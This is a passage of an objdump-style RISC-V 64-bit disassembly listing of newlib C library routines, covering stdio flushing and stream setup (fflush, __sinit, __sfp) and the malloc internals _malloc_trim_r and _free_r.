   12912:	f40755e3          	bgez	a4,1285c <__sflush_r+0xa8>
   12916:	e848                	sd	a0,144(s0)
   12918:	b791                	j	1285c <__sflush_r+0xa8>
   1291a:	0009a783          	lw	a5,0(s3)
   1291e:	ee0787e3          	beqz	a5,1280c <__sflush_r+0x58>
   12922:	4775                	li	a4,29
   12924:	00e78563          	beq	a5,a4,1292e <__sflush_r+0x17a>
   12928:	4759                	li	a4,22
   1292a:	f8e79ee3          	bne	a5,a4,128c6 <__sflush_r+0x112>
   1292e:	0099a023          	sw	s1,0(s3)
   12932:	4501                	li	a0,0
   12934:	b791                	j	12878 <__sflush_r+0xc4>
   12936:	777d                	lui	a4,0xfffff
   12938:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78ff>
   1293c:	6c14                	ld	a3,24(s0)
   1293e:	8ff9                	and	a5,a5,a4
   12940:	b7d1                	j	12904 <__sflush_r+0x150>
   12942:	0407e793          	ori	a5,a5,64
   12946:	00f41823          	sh	a5,16(s0)
   1294a:	557d                	li	a0,-1
   1294c:	b735                	j	12878 <__sflush_r+0xc4>

000000000001294e <_fflush_r>:
   1294e:	1101                	addi	sp,sp,-32
   12950:	e822                	sd	s0,16(sp)
   12952:	ec06                	sd	ra,24(sp)
   12954:	842a                	mv	s0,a0
   12956:	c119                	beqz	a0,1295c <_fflush_r+0xe>
   12958:	493c                	lw	a5,80(a0)
   1295a:	cb89                	beqz	a5,1296c <_fflush_r+0x1e>
   1295c:	01059783          	lh	a5,16(a1)
   12960:	ef89                	bnez	a5,1297a <_fflush_r+0x2c>
   12962:	60e2                	ld	ra,24(sp)
   12964:	6442                	ld	s0,16(sp)
   12966:	4501                	li	a0,0
   12968:	6105                	addi	sp,sp,32
   1296a:	8082                	ret
   1296c:	e42e                	sd	a1,8(sp)
   1296e:	276000ef          	jal	ra,12be4 <__sinit>
   12972:	65a2                	ld	a1,8(sp)
   12974:	01059783          	lh	a5,16(a1)
   12978:	d7ed                	beqz	a5,12962 <_fflush_r+0x14>
   1297a:	8522                	mv	a0,s0
   1297c:	6442                	ld	s0,16(sp)
   1297e:	60e2                	ld	ra,24(sp)
   12980:	6105                	addi	sp,sp,32
   12982:	bd0d                	j	127b4 <__sflush_r>

0000000000012984 <fflush>:
   12984:	85aa                	mv	a1,a0
   12986:	c501                	beqz	a0,1298e <fflush+0xa>
   12988:	8501b503          	ld	a0,-1968(gp) # 1f5d8 <_impure_ptr>
   1298c:	b7c9                	j	1294e <_fflush_r>
   1298e:	00000597          	auipc	a1,0x0
   12992:	fc058593          	addi	a1,a1,-64 # 1294e <_fflush_r>
   12996:	8301b503          	ld	a0,-2000(gp) # 1f5b8 <_global_impure_ptr>
   1299a:	1790006f          	j	13312 <_fwalk_reent>

000000000001299e <__fp_lock>:
   1299e:	4501                	li	a0,0
   129a0:	8082                	ret

00000000000129a2 <_cleanup_r>:
   129a2:	00007597          	auipc	a1,0x7
   129a6:	37858593          	addi	a1,a1,888 # 19d1a <_fclose_r>
   129aa:	1690006f          	j	13312 <_fwalk_reent>

00000000000129ae <__sinit.part.0>:
   129ae:	7139                	addi	sp,sp,-64
   129b0:	fc06                	sd	ra,56(sp)
   129b2:	f822                	sd	s0,48(sp)
   129b4:	f426                	sd	s1,40(sp)
   129b6:	f04a                	sd	s2,32(sp)
   129b8:	ec4e                	sd	s3,24(sp)
   129ba:	e852                	sd	s4,16(sp)
   129bc:	e456                	sd	s5,8(sp)
   129be:	e05a                	sd	s6,0(sp)
   129c0:	6500                	ld	s0,8(a0)
   129c2:	00000717          	auipc	a4,0x0
   129c6:	fe070713          	addi	a4,a4,-32 # 129a2 <_cleanup_r>
   129ca:	ed38                	sd	a4,88(a0)
   129cc:	53850793          	addi	a5,a0,1336
   129d0:	470d                	li	a4,3
   129d2:	52e52423          	sw	a4,1320(a0)
   129d6:	52f53823          	sd	a5,1328(a0)
   129da:	52053023          	sd	zero,1312(a0)
   129de:	4791                	li	a5,4
   129e0:	892a                	mv	s2,a0
   129e2:	c81c                	sw	a5,16(s0)
   129e4:	4621                	li	a2,8
   129e6:	4581                	li	a1,0
   129e8:	0a042623          	sw	zero,172(s0)
   129ec:	00043023          	sd	zero,0(s0)
   129f0:	00043423          	sd	zero,8(s0)
   129f4:	00043c23          	sd	zero,24(s0)
   129f8:	02042023          	sw	zero,32(s0)
   129fc:	02042423          	sw	zero,40(s0)
   12a00:	0a440513          	addi	a0,s0,164
   12a04:	d31fd0ef          	jal	ra,10734 <memset>
   12a08:	01093483          	ld	s1,16(s2)
   12a0c:	00004b17          	auipc	s6,0x4
   12a10:	594b0b13          	addi	s6,s6,1428 # 16fa0 <__sread>
   12a14:	00004a97          	auipc	s5,0x4
   12a18:	5c8a8a93          	addi	s5,s5,1480 # 16fdc <__swrite>
   12a1c:	00004a17          	auipc	s4,0x4
   12a20:	614a0a13          	addi	s4,s4,1556 # 17030 <__sseek>
   12a24:	00004997          	auipc	s3,0x4
   12a28:	64e98993          	addi	s3,s3,1614 # 17072 <__sclose>
   12a2c:	67c1                	lui	a5,0x10
   12a2e:	03643c23          	sd	s6,56(s0)
   12a32:	05543023          	sd	s5,64(s0)
   12a36:	05443423          	sd	s4,72(s0)
   12a3a:	05343823          	sd	s3,80(s0)
   12a3e:	f800                	sd	s0,48(s0)
   12a40:	07a5                	addi	a5,a5,9
   12a42:	c89c                	sw	a5,16(s1)
   12a44:	4621                	li	a2,8
   12a46:	4581                	li	a1,0
   12a48:	0a04a623          	sw	zero,172(s1)
   12a4c:	0004b023          	sd	zero,0(s1)
   12a50:	0004b423          	sd	zero,8(s1)
   12a54:	0004bc23          	sd	zero,24(s1)
   12a58:	0204a023          	sw	zero,32(s1)
   12a5c:	0204a423          	sw	zero,40(s1)
   12a60:	0a448513          	addi	a0,s1,164
   12a64:	cd1fd0ef          	jal	ra,10734 <memset>
   12a68:	01893403          	ld	s0,24(s2)
   12a6c:	000207b7          	lui	a5,0x20
   12a70:	0364bc23          	sd	s6,56(s1)
   12a74:	0554b023          	sd	s5,64(s1)
   12a78:	0544b423          	sd	s4,72(s1)
   12a7c:	0534b823          	sd	s3,80(s1)
   12a80:	f884                	sd	s1,48(s1)
   12a82:	07c9                	addi	a5,a5,18
   12a84:	c81c                	sw	a5,16(s0)
   12a86:	0a042623          	sw	zero,172(s0)
   12a8a:	00043023          	sd	zero,0(s0)
   12a8e:	00043423          	sd	zero,8(s0)
   12a92:	00043c23          	sd	zero,24(s0)
   12a96:	02042023          	sw	zero,32(s0)
   12a9a:	02042423          	sw	zero,40(s0)
   12a9e:	0a440513          	addi	a0,s0,164
   12aa2:	4621                	li	a2,8
   12aa4:	4581                	li	a1,0
   12aa6:	c8ffd0ef          	jal	ra,10734 <memset>
   12aaa:	70e2                	ld	ra,56(sp)
   12aac:	03643c23          	sd	s6,56(s0)
   12ab0:	05543023          	sd	s5,64(s0)
   12ab4:	05443423          	sd	s4,72(s0)
   12ab8:	05343823          	sd	s3,80(s0)
   12abc:	f800                	sd	s0,48(s0)
   12abe:	7442                	ld	s0,48(sp)
   12ac0:	4785                	li	a5,1
   12ac2:	04f92823          	sw	a5,80(s2)
   12ac6:	74a2                	ld	s1,40(sp)
   12ac8:	7902                	ld	s2,32(sp)
   12aca:	69e2                	ld	s3,24(sp)
   12acc:	6a42                	ld	s4,16(sp)
   12ace:	6aa2                	ld	s5,8(sp)
   12ad0:	6b02                	ld	s6,0(sp)
   12ad2:	6121                	addi	sp,sp,64
   12ad4:	8082                	ret

0000000000012ad6 <__fp_unlock>:
   12ad6:	4501                	li	a0,0
   12ad8:	8082                	ret

0000000000012ada <__sfmoreglue>:
   12ada:	1101                	addi	sp,sp,-32
   12adc:	e426                	sd	s1,8(sp)
   12ade:	0b000613          	li	a2,176
   12ae2:	fff5849b          	addiw	s1,a1,-1
   12ae6:	02c484b3          	mul	s1,s1,a2
   12aea:	e04a                	sd	s2,0(sp)
   12aec:	892e                	mv	s2,a1
   12aee:	e822                	sd	s0,16(sp)
   12af0:	ec06                	sd	ra,24(sp)
   12af2:	0c848593          	addi	a1,s1,200
   12af6:	315020ef          	jal	ra,1560a <_malloc_r>
   12afa:	842a                	mv	s0,a0
   12afc:	cd01                	beqz	a0,12b14 <__sfmoreglue+0x3a>
   12afe:	0561                	addi	a0,a0,24
   12b00:	00043023          	sd	zero,0(s0)
   12b04:	01242423          	sw	s2,8(s0)
   12b08:	e808                	sd	a0,16(s0)
   12b0a:	0b048613          	addi	a2,s1,176
   12b0e:	4581                	li	a1,0
   12b10:	c25fd0ef          	jal	ra,10734 <memset>
   12b14:	60e2                	ld	ra,24(sp)
   12b16:	8522                	mv	a0,s0
   12b18:	6442                	ld	s0,16(sp)
   12b1a:	64a2                	ld	s1,8(sp)
   12b1c:	6902                	ld	s2,0(sp)
   12b1e:	6105                	addi	sp,sp,32
   12b20:	8082                	ret

0000000000012b22 <__sfp>:
   12b22:	7179                	addi	sp,sp,-48
   12b24:	ec26                	sd	s1,24(sp)
   12b26:	8301b483          	ld	s1,-2000(gp) # 1f5b8 <_global_impure_ptr>
   12b2a:	48bc                	lw	a5,80(s1)
   12b2c:	e84a                	sd	s2,16(sp)
   12b2e:	f406                	sd	ra,40(sp)
   12b30:	f022                	sd	s0,32(sp)
   12b32:	e44e                	sd	s3,8(sp)
   12b34:	892a                	mv	s2,a0
   12b36:	c3c9                	beqz	a5,12bb8 <__sfp+0x96>
   12b38:	52048493          	addi	s1,s1,1312
   12b3c:	0b000993          	li	s3,176
   12b40:	449c                	lw	a5,8(s1)
   12b42:	6880                	ld	s0,16(s1)
   12b44:	06f05663          	blez	a5,12bb0 <__sfp+0x8e>
   12b48:	37fd                	addiw	a5,a5,-1
   12b4a:	1782                	slli	a5,a5,0x20
   12b4c:	9381                	srli	a5,a5,0x20
   12b4e:	0785                	addi	a5,a5,1
   12b50:	033787b3          	mul	a5,a5,s3
   12b54:	97a2                	add	a5,a5,s0
   12b56:	a029                	j	12b60 <__sfp+0x3e>
   12b58:	0b040413          	addi	s0,s0,176
   12b5c:	04878a63          	beq	a5,s0,12bb0 <__sfp+0x8e>
   12b60:	01041703          	lh	a4,16(s0)
   12b64:	fb75                	bnez	a4,12b58 <__sfp+0x36>
   12b66:	77c1                	lui	a5,0xffff0
   12b68:	0785                	addi	a5,a5,1
   12b6a:	0a042623          	sw	zero,172(s0)
   12b6e:	00043023          	sd	zero,0(s0)
   12b72:	00043423          	sd	zero,8(s0)
   12b76:	c81c                	sw	a5,16(s0)
   12b78:	00043c23          	sd	zero,24(s0)
   12b7c:	02042023          	sw	zero,32(s0)
   12b80:	02042423          	sw	zero,40(s0)
   12b84:	4621                	li	a2,8
   12b86:	4581                	li	a1,0
   12b88:	0a440513          	addi	a0,s0,164
   12b8c:	ba9fd0ef          	jal	ra,10734 <memset>
   12b90:	04043c23          	sd	zero,88(s0)
   12b94:	06042023          	sw	zero,96(s0)
   12b98:	06043c23          	sd	zero,120(s0)
   12b9c:	08042023          	sw	zero,128(s0)
   12ba0:	70a2                	ld	ra,40(sp)
   12ba2:	8522                	mv	a0,s0
   12ba4:	7402                	ld	s0,32(sp)
   12ba6:	64e2                	ld	s1,24(sp)
   12ba8:	6942                	ld	s2,16(sp)
   12baa:	69a2                	ld	s3,8(sp)
   12bac:	6145                	addi	sp,sp,48
   12bae:	8082                	ret
   12bb0:	6080                	ld	s0,0(s1)
   12bb2:	c419                	beqz	s0,12bc0 <__sfp+0x9e>
   12bb4:	84a2                	mv	s1,s0
   12bb6:	b769                	j	12b40 <__sfp+0x1e>
   12bb8:	8526                	mv	a0,s1
   12bba:	df5ff0ef          	jal	ra,129ae <__sinit.part.0>
   12bbe:	bfad                	j	12b38 <__sfp+0x16>
   12bc0:	4591                	li	a1,4
   12bc2:	854a                	mv	a0,s2
   12bc4:	f17ff0ef          	jal	ra,12ada <__sfmoreglue>
   12bc8:	e088                	sd	a0,0(s1)
   12bca:	842a                	mv	s0,a0
   12bcc:	f565                	bnez	a0,12bb4 <__sfp+0x92>
   12bce:	47b1                	li	a5,12
   12bd0:	00f92023          	sw	a5,0(s2)
   12bd4:	b7f1                	j	12ba0 <__sfp+0x7e>

0000000000012bd6 <_cleanup>:
   12bd6:	00007597          	auipc	a1,0x7
   12bda:	14458593          	addi	a1,a1,324 # 19d1a <_fclose_r>
   12bde:	8301b503          	ld	a0,-2000(gp) # 1f5b8 <_global_impure_ptr>
   12be2:	af05                	j	13312 <_fwalk_reent>

0000000000012be4 <__sinit>:
   12be4:	493c                	lw	a5,80(a0)
   12be6:	c391                	beqz	a5,12bea <__sinit+0x6>
   12be8:	8082                	ret
   12bea:	b3d1                	j	129ae <__sinit.part.0>

0000000000012bec <__sfp_lock_acquire>:
   12bec:	8082                	ret

0000000000012bee <__sfp_lock_release>:
   12bee:	8082                	ret

0000000000012bf0 <__sinit_lock_acquire>:
   12bf0:	8082                	ret

0000000000012bf2 <__sinit_lock_release>:
   12bf2:	8082                	ret

0000000000012bf4 <__fp_lock_all>:
   12bf4:	00000597          	auipc	a1,0x0
   12bf8:	daa58593          	addi	a1,a1,-598 # 1299e <__fp_lock>
   12bfc:	8501b503          	ld	a0,-1968(gp) # 1f5d8 <_impure_ptr>
   12c00:	ad41                	j	13290 <_fwalk>

0000000000012c02 <__fp_unlock_all>:
   12c02:	00000597          	auipc	a1,0x0
   12c06:	ed458593          	addi	a1,a1,-300 # 12ad6 <__fp_unlock>
   12c0a:	8501b503          	ld	a0,-1968(gp) # 1f5d8 <_impure_ptr>
   12c0e:	a549                	j	13290 <_fwalk>

0000000000012c10 <__libc_fini_array>:
   12c10:	1101                	addi	sp,sp,-32
   12c12:	e822                	sd	s0,16(sp)
   12c14:	0000b797          	auipc	a5,0xb
   12c18:	7d478793          	addi	a5,a5,2004 # 1e3e8 <__fini_array_end>
   12c1c:	0000b417          	auipc	s0,0xb
   12c20:	7c440413          	addi	s0,s0,1988 # 1e3e0 <__init_array_end>
   12c24:	8f81                	sub	a5,a5,s0
   12c26:	e426                	sd	s1,8(sp)
   12c28:	ec06                	sd	ra,24(sp)
   12c2a:	4037d493          	srai	s1,a5,0x3
   12c2e:	c881                	beqz	s1,12c3e <__libc_fini_array+0x2e>
   12c30:	17e1                	addi	a5,a5,-8
   12c32:	943e                	add	s0,s0,a5
   12c34:	601c                	ld	a5,0(s0)
   12c36:	14fd                	addi	s1,s1,-1
   12c38:	1461                	addi	s0,s0,-8
   12c3a:	9782                	jalr	a5
   12c3c:	fce5                	bnez	s1,12c34 <__libc_fini_array+0x24>
   12c3e:	60e2                	ld	ra,24(sp)
   12c40:	6442                	ld	s0,16(sp)
   12c42:	64a2                	ld	s1,8(sp)
   12c44:	6105                	addi	sp,sp,32
   12c46:	8082                	ret

0000000000012c48 <_malloc_trim_r>:
   12c48:	7179                	addi	sp,sp,-48
   12c4a:	f022                	sd	s0,32(sp)
   12c4c:	ec26                	sd	s1,24(sp)
   12c4e:	e84a                	sd	s2,16(sp)
   12c50:	e44e                	sd	s3,8(sp)
   12c52:	e052                	sd	s4,0(sp)
   12c54:	89ae                	mv	s3,a1
   12c56:	f406                	sd	ra,40(sp)
   12c58:	0000ca17          	auipc	s4,0xc
   12c5c:	120a0a13          	addi	s4,s4,288 # 1ed78 <__malloc_av_>
   12c60:	892a                	mv	s2,a0
   12c62:	26a030ef          	jal	ra,15ecc <__malloc_lock>
   12c66:	010a3703          	ld	a4,16(s4)
   12c6a:	6785                	lui	a5,0x1
   12c6c:	fdf78413          	addi	s0,a5,-33 # fdf <register_fini-0xf0d1>
   12c70:	6704                	ld	s1,8(a4)
   12c72:	41340433          	sub	s0,s0,s3
   12c76:	98f1                	andi	s1,s1,-4
   12c78:	9426                	add	s0,s0,s1
   12c7a:	8031                	srli	s0,s0,0xc
   12c7c:	147d                	addi	s0,s0,-1
   12c7e:	0432                	slli	s0,s0,0xc
   12c80:	00f44b63          	blt	s0,a5,12c96 <_malloc_trim_r+0x4e>
   12c84:	4581                	li	a1,0
   12c86:	854a                	mv	a0,s2
   12c88:	1d4040ef          	jal	ra,16e5c <_sbrk_r>
   12c8c:	010a3783          	ld	a5,16(s4)
   12c90:	97a6                	add	a5,a5,s1
   12c92:	00f50e63          	beq	a0,a5,12cae <_malloc_trim_r+0x66>
   12c96:	854a                	mv	a0,s2
   12c98:	236030ef          	jal	ra,15ece <__malloc_unlock>
   12c9c:	70a2                	ld	ra,40(sp)
   12c9e:	7402                	ld	s0,32(sp)
   12ca0:	64e2                	ld	s1,24(sp)
   12ca2:	6942                	ld	s2,16(sp)
   12ca4:	69a2                	ld	s3,8(sp)
   12ca6:	6a02                	ld	s4,0(sp)
   12ca8:	4501                	li	a0,0
   12caa:	6145                	addi	sp,sp,48
   12cac:	8082                	ret
   12cae:	408005b3          	neg	a1,s0
   12cb2:	854a                	mv	a0,s2
   12cb4:	1a8040ef          	jal	ra,16e5c <_sbrk_r>
   12cb8:	57fd                	li	a5,-1
   12cba:	02f50a63          	beq	a0,a5,12cee <_malloc_trim_r+0xa6>
   12cbe:	0c818713          	addi	a4,gp,200 # 1fe50 <__malloc_current_mallinfo>
   12cc2:	431c                	lw	a5,0(a4)
   12cc4:	010a3683          	ld	a3,16(s4)
   12cc8:	8c81                	sub	s1,s1,s0
   12cca:	0014e493          	ori	s1,s1,1
   12cce:	4087843b          	subw	s0,a5,s0
   12cd2:	854a                	mv	a0,s2
   12cd4:	e684                	sd	s1,8(a3)
   12cd6:	c300                	sw	s0,0(a4)
   12cd8:	1f6030ef          	jal	ra,15ece <__malloc_unlock>
   12cdc:	70a2                	ld	ra,40(sp)
   12cde:	7402                	ld	s0,32(sp)
   12ce0:	64e2                	ld	s1,24(sp)
   12ce2:	6942                	ld	s2,16(sp)
   12ce4:	69a2                	ld	s3,8(sp)
   12ce6:	6a02                	ld	s4,0(sp)
   12ce8:	4505                	li	a0,1
   12cea:	6145                	addi	sp,sp,48
   12cec:	8082                	ret
   12cee:	4581                	li	a1,0
   12cf0:	854a                	mv	a0,s2
   12cf2:	16a040ef          	jal	ra,16e5c <_sbrk_r>
   12cf6:	010a3703          	ld	a4,16(s4)
   12cfa:	46fd                	li	a3,31
   12cfc:	40e507b3          	sub	a5,a0,a4
   12d00:	f8f6dbe3          	bge	a3,a5,12c96 <_malloc_trim_r+0x4e>
   12d04:	8581b683          	ld	a3,-1960(gp) # 1f5e0 <__malloc_sbrk_base>
   12d08:	8d15                	sub	a0,a0,a3
   12d0a:	0017e793          	ori	a5,a5,1
   12d0e:	0ca1a423          	sw	a0,200(gp) # 1fe50 <__malloc_current_mallinfo>
   12d12:	e71c                	sd	a5,8(a4)
   12d14:	b749                	j	12c96 <_malloc_trim_r+0x4e>

0000000000012d16 <_free_r>:
   12d16:	c5f5                	beqz	a1,12e02 <_free_r+0xec>
   12d18:	1101                	addi	sp,sp,-32
   12d1a:	e822                	sd	s0,16(sp)
   12d1c:	e426                	sd	s1,8(sp)
   12d1e:	842e                	mv	s0,a1
   12d20:	84aa                	mv	s1,a0
   12d22:	ec06                	sd	ra,24(sp)
   12d24:	1a8030ef          	jal	ra,15ecc <__malloc_lock>
   12d28:	ff843583          	ld	a1,-8(s0)
   12d2c:	ff040713          	addi	a4,s0,-16
   12d30:	0000c517          	auipc	a0,0xc
   12d34:	04850513          	addi	a0,a0,72 # 1ed78 <__malloc_av_>
   12d38:	ffe5f793          	andi	a5,a1,-2
   12d3c:	00f70633          	add	a2,a4,a5
   12d40:	6614                	ld	a3,8(a2)
   12d42:	01053803          	ld	a6,16(a0)
   12d46:	9af1                	andi	a3,a3,-4
   12d48:	14c80063          	beq	a6,a2,12e88 <_free_r+0x172>
   12d4c:	e614                	sd	a3,8(a2)
   12d4e:	8985                	andi	a1,a1,1
   12d50:	00d60833          	add	a6,a2,a3
   12d54:	e1c1                	bnez	a1,12dd4 <_free_r+0xbe>
   12d56:	ff043303          	ld	t1,-16(s0)
   12d5a:	00883583          	ld	a1,8(a6)
   12d5e:	0000c897          	auipc	a7,0xc
   12d62:	02a88893          	addi	a7,a7,42 # 1ed88 <__malloc_av_+0x10>
   12d66:	40670733          	sub	a4,a4,t1
   12d6a:	01073803          	ld	a6,16(a4)
   12d6e:	979a                	add	a5,a5,t1
   12d70:	8985                	andi	a1,a1,1
   12d72:	0f180863          	beq	a6,a7,12e62 <_free_r+0x14c>
   12d76:	01873303          	ld	t1,24(a4)
   12d7a:	00683c23          	sd	t1,24(a6)
   12d7e:	01033823          	sd	a6,16(t1)
   12d82:	14058d63          	beqz	a1,12edc <_free_r+0x1c6>
   12d86:	0017e693          	ori	a3,a5,1
   12d8a:	e714                	sd	a3,8(a4)
   12d8c:	e21c                	sd	a5,0(a2)
   12d8e:	1ff00693          	li	a3,511
   12d92:	08f6e263          	bltu	a3,a5,12e16 <_free_r+0x100>
   12d96:	838d                	srli	a5,a5,0x3
   12d98:	0017869b          	addiw	a3,a5,1
   12d9c:	0016969b          	slliw	a3,a3,0x1
   12da0:	068e                	slli	a3,a3,0x3
   12da2:	00853803          	ld	a6,8(a0)
   12da6:	96aa                	add	a3,a3,a0
   12da8:	628c                	ld	a1,0(a3)
   12daa:	4027d61b          	sraiw	a2,a5,0x2
   12dae:	4785                	li	a5,1
   12db0:	00c797b3          	sll	a5,a5,a2
   12db4:	0107e7b3          	or	a5,a5,a6
   12db8:	ff068613          	addi	a2,a3,-16
   12dbc:	ef10                	sd	a2,24(a4)
   12dbe:	eb0c                	sd	a1,16(a4)
   12dc0:	e51c                	sd	a5,8(a0)
   12dc2:	e298                	sd	a4,0(a3)
   12dc4:	ed98                	sd	a4,24(a1)
   12dc6:	6442                	ld	s0,16(sp)
   12dc8:	60e2                	ld	ra,24(sp)
   12dca:	8526                	mv	a0,s1
   12dcc:	64a2                	ld	s1,8(sp)
   12dce:	6105                	addi	sp,sp,32
   12dd0:	0fe0306f          	j	15ece <__malloc_unlock>
   12dd4:	00883583          	ld	a1,8(a6)
   12dd8:	8985                	andi	a1,a1,1
   12dda:	e58d                	bnez	a1,12e04 <_free_r+0xee>
   12ddc:	97b6                	add	a5,a5,a3
   12dde:	0000c897          	auipc	a7,0xc
   12de2:	faa88893          	addi	a7,a7,-86 # 1ed88 <__malloc_av_+0x10>
   12de6:	6a14                	ld	a3,16(a2)
   12de8:	0017e813          	ori	a6,a5,1
   12dec:	00f705b3          	add	a1,a4,a5
   12df0:	11168063          	beq	a3,a7,12ef0 <_free_r+0x1da>
   12df4:	6e10                	ld	a2,24(a2)
   12df6:	ee90                	sd	a2,24(a3)
   12df8:	ea14                	sd	a3,16(a2)
   12dfa:	01073423          	sd	a6,8(a4)
   12dfe:	e19c                	sd	a5,0(a1)
   12e00:	b779                	j	12d8e <_free_r+0x78>
   12e02:	8082                	ret
   12e04:	0017e693          	ori	a3,a5,1
   12e08:	fed43c23          	sd	a3,-8(s0)
   12e0c:	e21c                	sd	a5,0(a2)
   12e0e:	1ff00693          	li	a3,511
   12e12:	f8f6f2e3          	bgeu	a3,a5,12d96 <_free_r+0x80>
   12e16:	0097d693          	srli	a3,a5,0x9
   12e1a:	4611                	li	a2,4
   12e1c:	08d66f63          	bltu	a2,a3,12eba <_free_r+0x1a4>
   12e20:	0067d693          	srli	a3,a5,0x6
   12e24:	0396859b          	addiw	a1,a3,57
   12e28:	0015959b          	slliw	a1,a1,0x1
   12e2c:	0386861b          	addiw	a2,a3,56
   12e30:	058e                	slli	a1,a1,0x3
   12e32:	95aa                	add	a1,a1,a0
   12e34:	6194                	ld	a3,0(a1)
   12e36:	15c1                	addi	a1,a1,-16
   12e38:	0cd58663          	beq	a1,a3,12f04 <_free_r+0x1ee>
   12e3c:	6690                	ld	a2,8(a3)
   12e3e:	9a71                	andi	a2,a2,-4
   12e40:	00c7f563          	bgeu	a5,a2,12e4a <_free_r+0x134>
   12e44:	6a94                	ld	a3,16(a3)
   12e46:	fed59be3          	bne	a1,a3,12e3c <_free_r+0x126>
   12e4a:	6e8c                	ld	a1,24(a3)
   12e4c:	ef0c                	sd	a1,24(a4)
   12e4e:	eb14                	sd	a3,16(a4)
   12e50:	6442                	ld	s0,16(sp)
   12e52:	60e2                	ld	ra,24(sp)
   12e54:	e998                	sd	a4,16(a1)
   12e56:	8526                	mv	a0,s1
   12e58:	64a2                	ld	s1,8(sp)
   12e5a:	ee98                	sd	a4,24(a3)
   12e5c:	6105                	addi	sp,sp,32
   12e5e:	0700306f          	j	15ece <__malloc_unlock>
   12e62:	0e059d63          	bnez	a1,12f5c <_free_r+0x246>
   12e66:	6e0c                	ld	a1,24(a2)
   12e68:	6a10                	ld	a2,16(a2)
   12e6a:	97b6                	add	a5,a5,a3
   12e6c:	6442                	ld	s0,16(sp)
   12e6e:	ee0c                	sd	a1,24(a2)
   12e70:	e990                	sd	a2,16(a1)
   12e72:	0017e693          	ori	a3,a5,1
   12e76:	60e2                	ld	ra,24(sp)
   12e78:	e714                	sd	a3,8(a4)
   12e7a:	8526                	mv	a0,s1
   12e7c:	973e                	add	a4,a4,a5
   12e7e:	64a2                	ld	s1,8(sp)
   12e80:	e31c                	sd	a5,0(a4)
   12e82:	6105                	addi	sp,sp,32
   12e84:	04a0306f          	j	15ece <__malloc_unlock>
   12e88:	8985                	andi	a1,a1,1
   12e8a:	97b6                	add	a5,a5,a3
   12e8c:	e989                	bnez	a1,12e9e <_free_r+0x188>
   12e8e:	ff043583          	ld	a1,-16(s0)
   12e92:	8f0d                	sub	a4,a4,a1
   12e94:	6f14                	ld	a3,24(a4)
   12e96:	6b10                	ld	a2,16(a4)
   12e98:	97ae                	add	a5,a5,a1
   12e9a:	ee14                	sd	a3,24(a2)
   12e9c:	ea90                	sd	a2,16(a3)
   12e9e:	0017e693          	ori	a3,a5,1
   12ea2:	e714                	sd	a3,8(a4)
   12ea4:	e918                	sd	a4,16(a0)
   12ea6:	8601b703          	ld	a4,-1952(gp) # 1f5e8 <__malloc_trim_threshold>
   12eaa:	f0e7eee3          	bltu	a5,a4,12dc6 <_free_r+0xb0>
   12eae:	8801b583          	ld	a1,-1920(gp) # 1f608 <__malloc_top_pad>
   12eb2:	8526                	mv	a0,s1
   12eb4:	d95ff0ef          	jal	ra,12c48 <_malloc_trim_r>
   12eb8:	b739                	j	12dc6 <_free_r+0xb0>
   12eba:	4651                	li	a2,20
   12ebc:	02d67263          	bgeu	a2,a3,12ee0 <_free_r+0x1ca>
   12ec0:	05400613          	li	a2,84
   12ec4:	04d66b63          	bltu	a2,a3,12f1a <_free_r+0x204>
   12ec8:	00c7d693          	srli	a3,a5,0xc
   12ecc:	06f6859b          	addiw	a1,a3,111
   12ed0:	0015959b          	slliw	a1,a1,0x1
   12ed4:	06e6861b          	addiw	a2,a3,110
   12ed8:	058e                	slli	a1,a1,0x3
   12eda:	bfa1                	j	12e32 <_free_r+0x11c>
   12edc:	97b6                	add	a5,a5,a3
   12ede:	b721                	j	12de6 <_free_r+0xd0>
   12ee0:	05c6859b          	addiw	a1,a3,92
   12ee4:	0015959b          	slliw	a1,a1,0x1
   12ee8:	05b6861b          	addiw	a2,a3,91
   12eec:	058e                	slli	a1,a1,0x3
   12eee:	b791                	j	12e32 <_free_r+0x11c>
   12ef0:	f518                	sd	a4,40(a0)
   12ef2:	f118                	sd	a4,32(a0)
   12ef4:	01173c23          	sd	a7,24(a4)
   12ef8:	01173823          	sd	a7,16(a4)
   12efc:	01073423          	sd	a6,8(a4)
   12f00:	e19c                	sd	a5,0(a1)
   12f02:	b5d1                	j	12dc6 <_free_r+0xb0>
   12f04:	00853803          	ld	a6,8(a0)
   12f08:	4026561b          	sraiw	a2,a2,0x2
   12f0c:	4785                	li	a5,1
   12f0e:	00c79633          	sll	a2,a5,a2
   12f12:	01066633          	or	a2,a2,a6
   12f16:	e510                	sd	a2,8(a0)
   12f18:	bf15                	j	12e4c <_free_r+0x136>
   12f1a:	15400613          	li	a2,340
   12f1e:	00d66c63          	bltu	a2,a3,12f36 <_free_r+0x220>
   12f22:	00f7d693          	srli	a3,a5,0xf
   12f26:	0786859b          	addiw	a1,a3,120
   12f2a:	0015959b          	slliw	a1,a1,0x1
   12f2e:	0776861b          	addiw	a2,a3,119
   12f32:	058e                	slli	a1,a1,0x3
   12f34:	bdfd                	j	12e32 <_free_r+0x11c>
   12f36:	55400613          	li	a2,1364
   12f3a:	00d66c63          	bltu	a2,a3,12f52 <_free_r+0x23c>
   12f3e:	0127d693          	srli	a3,a5,0x12
   12f42:	07d6859b          	addiw	a1,a3,125
   12f46:	0015959b          	slliw	a1,a1,0x1
   12f4a:	07c6861b          	addiw	a2,a3,124
   12f4e:	058e                	slli	a1,a1,0x3
   12f50:	b5cd                	j	12e32 <_free_r+0x11c>
   12f52:	7f000593          	li	a1,2032
   12f56:	07e00613          	li	a2,126
   12f5a:	bde1                	j	12e32 <_free_r+0x11c>
   12f5c:	0017e693          	ori	a3,a5,1
   12f60:	e714                	sd	a3,8(a4)
   12f62:	e21c                	sd	a5,0(a2)
   12f64:	b58d                	j	12dc6 <_free_r+0xb0>

0000000000012f66 <__sfvwrite_r>:
   12f66:	6a1c                	ld	a5,16(a2)
   12f68:	1a078c63          	beqz	a5,13120 <__sfvwrite_r+0x1ba>
   12f6c:	0105d783          	lhu	a5,16(a1)
   12f70:	711d                	addi	sp,sp,-96
   12f72:	e8a2                	sd	s0,80(sp)
   12f74:	f852                	sd	s4,48(sp)
   12f76:	f456                	sd	s5,40(sp)
   12f78:	ec86                	sd	ra,88(sp)
   12f7a:	e4a6                	sd	s1,72(sp)
   12f7c:	e0ca                	sd	s2,64(sp)
   12f7e:	fc4e                	sd	s3,56(sp)
   12f80:	f05a                	sd	s6,32(sp)
